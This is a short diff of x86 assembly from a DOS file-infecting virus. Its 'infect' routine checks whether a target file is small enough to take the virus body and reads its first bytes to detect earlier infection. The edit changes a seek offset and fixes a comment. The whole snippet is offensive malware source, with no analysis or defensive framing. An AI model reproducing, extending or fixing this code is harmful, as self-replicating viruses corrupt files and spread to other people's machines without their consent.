@@ -152,12 +152,13 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bx
      push bx          ; BX = File Handle
      xor cx, cx       ; CX = 0
-     xor dx, dx       ; DX = 0
+     mov dx, 5        ; DX = 5
      int 21h          ; Calling int 21h
      pop bx
-     cmp ax, 65436-virus_size   ; I the file too big??
+     cmp ax, 65436-virus_size   ; Is the file too big??
      jae .abort_infection
      push bx          ; Nope, perfetto sizo. BX = File handle
+
 
      mov ax, 3f00h    ; Read file or device
      mov cx, 5        ; Read 5 bytes, this case from the start to check wheter it's already infected, since we dont wanna have repeated infections
